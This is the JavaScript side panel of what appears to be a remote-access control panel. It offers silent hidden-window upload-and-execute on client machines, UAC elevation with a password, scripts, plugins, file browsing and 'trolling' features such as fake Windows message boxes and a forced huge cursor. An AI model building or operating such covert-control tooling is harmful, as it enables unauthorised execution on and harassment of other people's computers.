  const progress = panel.querySelector("[data-rex-progress]");
  const footer = panel.querySelector("[data-rex-footer]");
  const labelEl = panel.querySelector("[data-rex-label]");
  const metaEl = panel.querySelector("[data-rex-meta]");
  const actionsEl = panel.querySelector("[data-rex-actions]");
  const track = panel.querySelector(".sp-rex-win98-track");
  if (form) form.hidden = true;
  if (progress) progress.hidden = false;
  if (footer) footer.hidden = true;
  if (labelEl) labelEl.textContent = label;
  if (metaEl) metaEl.innerHTML = metaHtml;
  setRexSegmentProgress(track, percent);
  if (actionsEl) {
    if (actionsHtml) {
      actionsEl.hidden = false;
      actionsEl.innerHTML = actionsHtml;
    } else {
      actionsEl.hidden = true;
      actionsEl.innerHTML = "";
    }
  }
}

function runRemoteExecuteInPanel(panel, clientId, options = {}) {
  const onDone = typeof options.onDone === "function" ? options.onDone : () => {};
  let pollTimer = null;
  let completed = false;
  let cancelling = false;
  let activeJobId = options.jobId || null;
  let stagingDone = options.kind === "execute";
  const xhr = options.kind === "upload" ? new XMLHttpRequest() : null;

  const cleanupTimers = () => {
    if (pollTimer) {
      clearTimeout(pollTimer);
      pollTimer = null;
    }
  };

  const finishIdle = (keepOpen = true) => {
    cleanupTimers();
    completed = true;
    onDone();
    if (!keepOpen) panel.remove();
  };

  async function cancelRemoteExecute() {
    if (completed || cancelling) return;
    cancelling = true;
    cleanupTimers();
    if (xhr && !stagingDone) {
      try {
        xhr.abort();
      } catch {
        /* ignore */
      }
      finishIdle(false);
      showToast("Upload cancelled", "info");
      return;
    }
    if (activeJobId) {
      try {
        await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(activeJobId)}`, {
          method: "DELETE",
          credentials: "include",
        });
      } catch {
        /* best effort */
      }
    }
    finishIdle(false);
    showToast("Remote execute cancelled", "info");
  }

  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
    btn.onclick = () => {
      if (!completed) void cancelRemoteExecute();
      else panel.remove();
    };
  });

  async function pollJob(jobId) {
    if (completed) return;
    try {
      const res = await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(jobId)}`, {
        credentials: "include",
      });
      const status = await res.json().catch(() => ({}));
      if (!res.ok) {
        if (res.status === 404) {
          clearRexReadyJob(clientId);
          throw new Error("Job expired â€” upload again");
        }
        throw new Error(status.message || `Remote execute status failed: ${res.status}`);
      }
      if (completed) return;

      const pct =
        status.status === "succeeded" || status.status === "ready"
          ? 100
          : Math.min(99, Math.max(0, Number(status.percent) || 0));
      const displayName = options.displayName || options.file?.name || status.originalName || "file";
      showRexPanelProgress(panel, {
        label: `${remoteExecutePhaseLabel(status.phase, status)}â€¦ ${pct}%`,
        percent: pct,
        metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes || options.file?.size }),
        actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
      });
      panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());

      if (status.status === "ready") {
        completed = true;
        cleanupTimers();
        saveRexReadyJob(clientId, status);
        onDone();
        showRexPanelProgress(panel, {
          label: "Uploaded â€” ready to execute",
          percent: 100,
          metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes }),
          actionsHtml: `
            <button type="button" class="sp-progress-action" data-rex-exec>Execute now</button>
            <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-dismiss>Close</button>
          `,
        });
        panel.querySelector("[data-rex-exec]")?.addEventListener("click", () => {
          const args = Array.isArray(status.args)
            ? status.args.map((a) => (/\s/.test(String(a)) ? `"${a}"` : String(a))).join(" ")
            : options.args;
          runRemoteExecuteInPanel(panel, clientId, {
            kind: "execute",
            jobId: status.jobId,
            displayName,
            hideWindow: !!status.hideWindow || !!options.hideWindow,
            args,
            onDone,
          });
        });
        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
          btn.onclick = () => panel.remove();
        });
        return;
      }

      if (status.status === "succeeded") {
        completed = true;
        clearRexReadyJob(clientId);
        cleanupTimers();
        onDone();
        showRexPanelProgress(panel, {
          label: "Execution completed 100%",
          percent: 100,
          metaHtml: renderRemoteExecuteDetails(status, { name: displayName, size: status.totalBytes }),
          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
        });
        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
          btn.onclick = () => panel.remove();
        });
        showToast(`Executed successfully: ${displayName}`, "success", 6000);
        return;
      }

      if (status.status === "failed") {
        completed = true;
        cleanupTimers();
        onDone();
        if (status?.error?.code === "cancelled") {
          panel.remove();
          showToast("Remote execute cancelled", "info");
          return;
        }
        showRexPanelProgress(panel, {
          label: "Failed",
          percent: Math.min(99, Number(status.percent) || 0),
          metaHtml: `<pre class="sp-rex-error">${escapeHtml(remoteExecuteErrorText(status))}</pre>`,
          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
        });
        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
        panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
          btn.onclick = () => panel.remove();
        });
        return;
      }

      const interval =
        status.phase === "client_transfer" ? REMOTE_EXECUTE_TRANSFER_POLL_MS : REMOTE_EXECUTE_POLL_MS;
      pollTimer = setTimeout(() => pollJob(jobId), interval);
    } catch (err) {
      if (completed) return;
      completed = true;
      cleanupTimers();
      onDone();
      showRexPanelProgress(panel, {
        label: "Failed",
        percent: 0,
        metaHtml: `<pre class="sp-rex-error">${escapeHtml(err.message || "Remote execute failed")}</pre>`,
        actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
      });
      panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
    }
  }

  if (options.kind === "execute") {
    showRexPanelProgress(panel, {
      label: "Starting executionâ€¦",
      percent: 15,
      metaHtml: `<div class="sp-progress-detail">${escapeHtml(options.displayName || "payload")}</div>`,
      actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
    });
    panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());

    const body = {};
    if (options.args) body.args = options.args;
    if (typeof options.hideWindow === "boolean") body.hideWindow = options.hideWindow;

    fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(options.jobId)}/execute`, {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    })
      .then(async (res) => {
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
          if (res.status === 404) clearRexReadyJob(clientId);
          throw new Error(data.message || `Execute failed: ${res.status}`);
        }
        activeJobId = options.jobId;
        pollJob(options.jobId);
      })
      .catch((err) => {
        if (completed) return;
        completed = true;
        onDone();
        showRexPanelProgress(panel, {
          label: "Failed",
          percent: 0,
          metaHtml: `<pre class="sp-rex-error">${escapeHtml(err.message || "Failed to start execution")}</pre>`,
          actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
        });
        panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
      });

    return { cancel: cancelRemoteExecute };
  }

  // Upload path
  const file = options.file;
  const mode = options.mode === "upload_only" ? "upload_only" : "upload_and_run";
  const formData = new FormData();
  formData.append("file", file);
  formData.append("mode", mode);
  if (options.args) formData.append("args", options.args);
  if (options.hideWindow) formData.append("hideWindow", "true");

  showRexPanelProgress(panel, {
    label: "Preparing remote executeâ€¦",
    percent: 0,
    metaHtml: `<div class="sp-progress-detail">${escapeHtml(file.name)}</div>`,
    actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
  });
  panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());

  xhr.upload.addEventListener("progress", (e) => {
    if (!e.lengthComputable || completed) return;
    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
    showRexPanelProgress(panel, {
      label: `Host to serverâ€¦ ${pct}%`,
      percent: Math.min(10, Math.floor(pct * 0.1)),
      metaHtml: `
        <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
        <div class="sp-progress-detail">Staging before client transfer</div>
      `,
      actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
    });
    panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
  });

  xhr.addEventListener("load", () => {
    if (completed) return;
    stagingDone = true;
    if (xhr.status >= 200 && xhr.status < 300) {
      try {
        const res = JSON.parse(xhr.responseText);
        if (res.ok && res.jobId) {
          activeJobId = res.jobId;
          const stagedPct = Math.max(10, Math.min(15, Number(res.percent) || 10));
          const ver = res.clientVersion ? ` Â· agent v${res.clientVersion}` : "";
          showRexPanelProgress(panel, {
            label: `Waiting for clientâ€¦ ${stagedPct}%`,
            percent: stagedPct,
            metaHtml: `
              <div class="sp-progress-detail">${escapeHtml(file.name)} Â· staged ${formatBytes(res.totalBytes || file.size)} Â· waiting for client pullâ€¦</div>
              <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}${escapeHtml(ver)}</div>
              <div class="sp-progress-detail">Mode: ${escapeHtml(mode === "upload_only" ? "upload only" : "upload & run")}</div>
            `,
            actionsHtml: `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-cancel>Cancel</button>`,
          });
          panel.querySelector("[data-rex-cancel]")?.addEventListener("click", () => void cancelRemoteExecute());
          pollJob(res.jobId);
        } else {
          completed = true;
          onDone();
          showRexPanelProgress(panel, {
            label: "Failed",
            percent: 0,
            metaHtml: `<pre class="sp-rex-error">${escapeHtml(res.message || "Remote execute failed")}</pre>`,
            actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
          });
          panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
        }
      } catch {
        completed = true;
        onDone();
        showToast("Remote execute response was not valid JSON", "error", 6000);
        panel.remove();
      }
    } else {
      let msg = "Upload failed";
      try {
        msg = JSON.parse(xhr.responseText).message || msg;
      } catch {
        /* ignore */
      }
      if (xhr.status === 403) msg = "Permission denied (requires silent-exec)";
      completed = true;
      onDone();
      showRexPanelProgress(panel, {
        label: "Failed",
        percent: 0,
        metaHtml: `<pre class="sp-rex-error">${escapeHtml(msg)}</pre>`,
        actionsHtml: `<button type="button" class="sp-progress-action" data-rex-dismiss>Close</button>`,
      });
      panel.querySelector("[data-rex-dismiss]")?.addEventListener("click", () => panel.remove());
    }
  });

  xhr.addEventListener("error", () => {
    if (completed) return;
    completed = true;
    onDone();
    showToast("Network error during upload", "error");
    panel.remove();
  });

  xhr.addEventListener("abort", () => {
    if (completed) return;
    completed = true;
    onDone();
  });

  xhr.open("POST", `/api/clients/${clientId}/remote-execute`);
  xhr.withCredentials = true;
  xhr.send(formData);

  return { cancel: cancelRemoteExecute };
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Trolling modals                                            */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function closeSpModal(overlay) {
  if (overlay && overlay.parentNode) overlay.remove();
}

function createSpModal({ title, bodyHtml, confirmLabel = "Send", onReady }) {
  return new Promise((resolve) => {
    const overlay = document.createElement("div");
    overlay.className = "sp-modal-overlay";
    overlay.innerHTML = `
      <div class="sp-modal" role="dialog" aria-modal="true">
        <div class="sp-modal-header">
          <span class="sp-modal-title"></span>
          <button type="button" class="sp-modal-close" aria-label="Close">&times;</button>
        </div>
        <div class="sp-modal-body"></div>
        <div class="sp-modal-footer">
          <button type="button" class="sp-modal-btn sp-modal-btn-cancel">Cancel</button>
          <button type="button" class="sp-modal-btn sp-modal-btn-confirm"></button>
        </div>
      </div>
    `;
    overlay.querySelector(".sp-modal-title").textContent = title;
    overlay.querySelector(".sp-modal-body").innerHTML = bodyHtml;
    overlay.querySelector(".sp-modal-btn-confirm").textContent = confirmLabel;

    const finish = (value) => {
      closeSpModal(overlay);
      resolve(value);
    };

    overlay.querySelector(".sp-modal-close").addEventListener("click", () => finish(null));
    overlay.querySelector(".sp-modal-btn-cancel").addEventListener("click", () => finish(null));
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) finish(null);
    });
    const confirm = () => {
      const form = overlay.querySelector(".sp-modal-body");
      finish(form);
    };
    overlay.querySelector(".sp-modal-btn-confirm").addEventListener("click", confirm);
    overlay.addEventListener("keydown", (e) => {
      if (e.key === "Escape") {
        finish(null);
        return;
      }
      if (e.key === "Enter" && e.target && e.target.tagName !== "TEXTAREA") {
        e.preventDefault();
        confirm();
      }
    });

    document.body.appendChild(overlay);
    if (typeof onReady === "function") onReady(overlay);
    const firstInput = overlay.querySelector("input, textarea, select, button");
    if (firstInput) firstInput.focus();
  });
}

function normalizeClientUrl(raw) {
  const value = String(raw || "").trim();
  if (!value) return { ok: false, error: "URL is required" };
  if (value.length > 2048) return { ok: false, error: "URL is too long" };

  let candidate = value;
  if (candidate.startsWith("//")) {
    candidate = `https:${candidate}`;
  } else {
    const bareScheme = candidate.match(/^(https?):(?!\/\/)(.+)$/i);
    if (bareScheme) {
      candidate = `${bareScheme[1].toLowerCase()}://${bareScheme[2]}`;
    } else if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
      candidate = `https://${candidate}`;
    }
  }

  try {
    const parsed = new URL(candidate);
    const scheme = parsed.protocol.replace(/:$/, "").toLowerCase();
    if (scheme !== "http" && scheme !== "https") {
      return { ok: false, error: "Only http and https URLs are allowed" };
    }
    if (!parsed.hostname) return { ok: false, error: "Invalid URL" };
    return { ok: true, url: parsed.toString() };
  } catch {
    return { ok: false, error: "Invalid URL" };
  }
}

async function openOpenUrlModal(clientId) {
  const body = await createSpModal({
    title: "Open URL",
    confirmLabel: "Open",
    bodyHtml: `
      <label class="sp-field">
        <span>URL</span>
        <input type="text" class="sp-input" data-sp-url placeholder="www.example.com or https://..." autocomplete="off" spellcheck="false" />
      </label>
      <p class="sp-hint">Opens in the client's default browser. Accepts www., http://, https://. Press Enter to open.</p>
    `,
  });
  if (!body) return;

  const raw = body.querySelector("[data-sp-url]")?.value || "";
  const normalized = normalizeClientUrl(raw);
  if (!normalized.ok) {
    showToast(normalized.error, "error");
    return;
  }

  showToast(`Opening ${normalized.url}â€¦`, "info", 2500);
  try {
    const result = await sendCommand(clientId, "open_url", { url: normalized.url });
    if (result && result.ok === false) {
      showToast(result.error || result.message || "Open URL failed", "error");
      return;
    }
    showToast(`Opened ${normalized.url}`, "success");
  } catch (err) {
    showToast(err.message || "Open URL failed", "error");
  }
}

async function openMessageBoxModal(clientId) {
  const body = await createSpModal({
    title: "Message Box",
    confirmLabel: "Show",
    bodyHtml: `
      <label class="sp-field">
        <span>Title</span>
        <input type="text" class="sp-input" data-sp-title value="Windows" maxlength="256" />
      </label>
      <label class="sp-field">
        <span>Message</span>
        <textarea class="sp-input sp-textarea" data-sp-text rows="3" maxlength="2048" placeholder="Something went wrong..."></textarea>
      </label>
      <fieldset class="sp-field sp-icon-field">
        <legend>Icon</legend>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="error" /> Error</label>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="warning" /> Warning</label>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="info" checked /> Info</label>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="question" /> Question</label>
      </fieldset>
    `,
  });
  if (!body) return;

  const title = (body.querySelector("[data-sp-title]")?.value || "").trim() || "Windows";
  const text = (body.querySelector("[data-sp-text]")?.value || "").trim();
  const icon = body.querySelector('input[name="sp-msg-icon"]:checked')?.value || "info";
  if (!text) {
    showToast("Message text is required", "error");
    return;
  }

  showToast("Showing message boxâ€¦", "info", 2500);
  try {
    const result = await sendCommand(clientId, "message_box", { title, text, icon });
    if (result && result.ok === false) {
      showToast(result.error || result.message || "Message box failed", "error");
      return;
    }
    showToast("Message box shown on client", "success");
  } catch (err) {
    showToast(err.message || "Message box failed", "error");
  }
}

async function openBigMouseModal(clientId) {
  const body = await createSpModal({
    title: "Big Mouse",
    confirmLabel: "Apply",
    bodyHtml: `
      <label class="sp-field">
        <span>Duration (seconds)</span>
        <input type="number" class="sp-input" data-sp-duration min="5" max="300" value="30" step="1" />
      </label>
      <div class="sp-field sp-icon-field" style="display:flex;gap:8px;flex-wrap:wrap">
        <button type="button" class="sp-modal-btn" data-sp-preset="15">15s</button>
        <button type="button" class="sp-modal-btn" data-sp-preset="30">30s</button>
        <button type="button" class="sp-modal-btn" data-sp-preset="60">60s</button>
      </div>
      <p class="sp-hint">Maximizes the Windows cursor size, then restores automatically. Windows only.</p>
    `,
    onReady(overlay) {
      const input = overlay.querySelector("[data-sp-duration]");
      for (const btn of overlay.querySelectorAll("[data-sp-preset]")) {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          if (input) input.value = btn.getAttribute("data-sp-preset") || "30";
        });
      }
    },
  });
  if (!body) return;

  const durationSec = Math.floor(Number(body.querySelector("[data-sp-duration]")?.value || 30));
  if (!Number.isFinite(durationSec) || durationSec < 5 || durationSec > 300) {
    showToast("Duration must be 5â€“300 seconds", "error");
    return;
  }

  showToast(`Making cursor huge for ${durationSec}sâ€¦`, "info", 2500);
  try {
    const result = await sendCommand(clientId, "cursor_big", { durationSec });
    if (result && result.ok === false) {
      showToast(result.error || result.message || "Big mouse failed", "error");
      return;
    }
    showToast(result?.message || `Big mouse applied for ${durationSec}s`, "success");
  } catch (err) {
    showToast(err.message || "Big mouse failed", "error");
  }
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Action handler                                             */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

async function handleAction(clientId, action) {
  playClickSound();
  try {
    switch (action) {
      case "ping":
        await sendCommand(clientId, "ping");
        showToast("Ping sent", "success");
        break;

      case "reconnect":
        await sendCommand(clientId, "reconnect");
        showToast("Reconnect signal sent", "success");
        break;

      case "disconnect": {
        if (!confirm("Disconnect this client?")) return;
        await sendCommand(clientId, "disconnect");
        showToast("Client disconnected", "success");
        break;
      }

      case "uninstall": {
        if (!confirm("Uninstall the agent from this client? This cannot be undone.")) return;
        await sendCommand(clientId, "uninstall");
        showToast("Uninstall command sent", "success");
        break;
      }

      case "elevate": {
        const password = prompt("UAC password (leave blank for none):");
        if (password === null) return;
        await sendCommand(clientId, "elevate", { password });
        showToast("Elevate command sent", "success");
        break;
      }

      case "set-nickname": {
        const nickname = prompt("Enter new nickname (blank to clear):");
        if (nickname === null) return;
        await patchClient(clientId, "nickname", nickname);
        showToast(nickname ? `Nickname set to "${nickname}"` : "Nickname cleared", "success");
        break;
      }

      case "wallpaper":
        triggerWallpaperUpload(clientId);
        break;

      case "remote-execute":
        openRemoteExecuteModal(clientId);
        break;

      case "open-url":
        openOpenUrlModal(clientId);
        break;

      case "message-box":
        openMessageBoxModal(clientId);
        break;

      case "big-mouse":
        openBigMouseModal(clientId);
        break;

      default:
        showToast(`Unknown action: ${action}`, "error");
    }
  } catch (err) {
    showToast(err.message || "Action failed", "error");
  }
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Dynamic sections (scripts & plugins)                       */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

async function loadScripts() {
  try {
    const res = await fetch("/api/saved-scripts", { credentials: "include" });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : data.scripts || [];
  } catch {
    return [];
  }
}

async function loadPlugins(clientId) {
  try {
    const res = await fetch(`/api/clients/${clientId}/plugins`, { credentials: "include" });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : data.plugins || [];
  } catch {
    return [];
  }
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  DOM builder                                                */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function buildPanel(clientId) {
  const panel = document.createElement("div");
  panel.className = "sp-inner";

  const home = document.createElement("a");
  home.className = "sp-item sp-home";
  home.href = "/";
  home.title = "Clients";
  home.innerHTML = `<i class="fa-solid fa-house" style="color:#818cf8"></i><span>Clients</span>`;
  panel.appendChild(home);

  /* ---- Static groups ---- */
  for (const group of PANEL_GROUPS) {
    const section = document.createElement("div");
    section.className = "sp-group";
    section.dataset.group = group.id;

    /* Toggle header */
    const toggle = document.createElement("button");
    toggle.className = "sp-group-toggle";
    toggle.type = "button";
    if (group.emoji) {
      toggle.innerHTML = `<span class="sp-group-emoji">${group.emoji}</span><span class="sp-group-label">${group.label}</span><i class="fa-solid fa-chevron-right sp-chevron"></i>`;
    } else {
      toggle.innerHTML = `<i class="${group.icon} sp-group-icon" style="color:${group.color}"></i><span class="sp-group-label">${group.label}</span><i class="fa-solid fa-chevron-right sp-chevron"></i>`;
    }
    toggle.title = group.label;
    toggle.addEventListener("click", () => {
      const rail = section.closest(".side-panel")?.classList.contains("is-collapsed");
      if (rail) {
        section.classList.toggle("is-rail-open");
        section.classList.toggle("is-open", section.classList.contains("is-rail-open"));
        return;
      }
      section.classList.toggle("is-open");
    });
    section.appendChild(toggle);

    /* Items container */
    const items = document.createElement("div");
    items.className = "sp-group-items";

    for (const item of group.items) {
      if (item.divider) {
        const hr = document.createElement("hr");
        hr.className = "sp-divider";
        items.appendChild(hr);
        continue;
      }

      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.title = item.label;
      btn.innerHTML = `<i class="${item.icon}" style="color:${item.color}"></i><span>${item.label}</span>`;

      if (item.open === "files") {
        btn.addEventListener("click", () => openFileBrowserWindow(clientId));
      } else if (item.open === "files-classic") {
        btn.addEventListener("click", () => openFileBrowserWindow(clientId, "classic"));
      } else if (item.open === "soundboard-remote") {
        btn.addEventListener("click", () => {
          const url = resolveOpenUrl(clientId, item.open);
          if (url) {
            window.open(
              url,
              `overlord-soundboard-${clientId}`,
              "width=420,height=640,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes",
            );
          }
        });
      } else if (item.open) {
        btn.addEventListener("click", () => {
          const url = resolveOpenUrl(clientId, item.open);
          if (url) window.open(url, "_blank");
        });
      } else if (item.action) {
        btn.addEventListener("click", () => handleAction(clientId, item.action));
      }

      items.appendChild(btn);
    }

    section.appendChild(items);
    panel.appendChild(section);
  }

  /* ---- Dynamic: Run Script ---- */
  const scriptSection = document.createElement("div");
  scriptSection.className = "sp-group sp-dynamic-section";
  scriptSection.dataset.group = "scripts";
  scriptSection.style.display = "none";
  scriptSection.innerHTML = `
    <button class="sp-group-toggle" type="button">
      <i class="fa-solid fa-code sp-group-icon" style="color:#a78bfa"></i>
      <span class="sp-group-label">Run Script</span>
      <i class="fa-solid fa-chevron-right sp-chevron"></i>
    </button>
    <div class="sp-group-items" id="sp-script-items"></div>
  `;
  scriptSection.querySelector(".sp-group-toggle").addEventListener("click", () => scriptSection.classList.toggle("is-open"));
  panel.appendChild(scriptSection);

  /* ---- Dynamic: Plugins ---- */
  const pluginSection = document.createElement("div");
  pluginSection.className = "sp-group sp-dynamic-section";
  pluginSection.dataset.group = "plugins";
  pluginSection.style.display = "none";
  pluginSection.innerHTML = `
    <button class="sp-group-toggle" type="button">
      <i class="fa-solid fa-puzzle-piece sp-group-icon" style="color:#fb923c"></i>
      <span class="sp-group-label">Plugins</span>
      <i class="fa-solid fa-chevron-right sp-chevron"></i>
    </button>
    <div class="sp-group-items" id="sp-plugin-items"></div>
  `;
  pluginSection.querySelector(".sp-group-toggle").addEventListener("click", () => pluginSection.classList.toggle("is-open"));
  panel.appendChild(pluginSection);

  /* ---- Populate dynamic sections ---- */
  loadScripts().then((scripts) => {
    if (!scripts.length) return;
    scriptSection.style.display = "";
    const container = scriptSection.querySelector("#sp-script-items");
    for (const script of scripts) {
      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="fa-solid fa-scroll" style="color:#c4b5fd"></i><span>${escapeHtml(script.name || script.title || "Script")}</span>`;
      btn.addEventListener("click", () => {
        window.open(`/scripts?clientId=${clientId}&scriptId=${script.id}`, "_blank");
      });
      container.appendChild(btn);
    }
  });

  loadPlugins(clientId).then((plugins) => {
    if (!plugins.length) return;
    pluginSection.style.display = "";
    const container = pluginSection.querySelector("#sp-plugin-items");
    for (const plugin of plugins) {
      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="fa-solid fa-plug" style="color:#fdba74"></i><span>${escapeHtml(plugin.name || "Plugin")}</span>`;
      btn.addEventListener("click", () => {
        window.open(`/plugins/${plugin.id}?clientId=${clientId}`, "_blank");
      });
      container.appendChild(btn);
    }
  });

  return panel;
}

function escapeHtml(str) {
  const d = document.createElement("div");
  d.textContent = str;
  return d.innerHTML;
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Public init                                                */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

export function initSidePanel(clientId, containerEl) {
  if (!clientId || !containerEl) return;
  containerEl.appendChild(buildPanel(clientId));
}
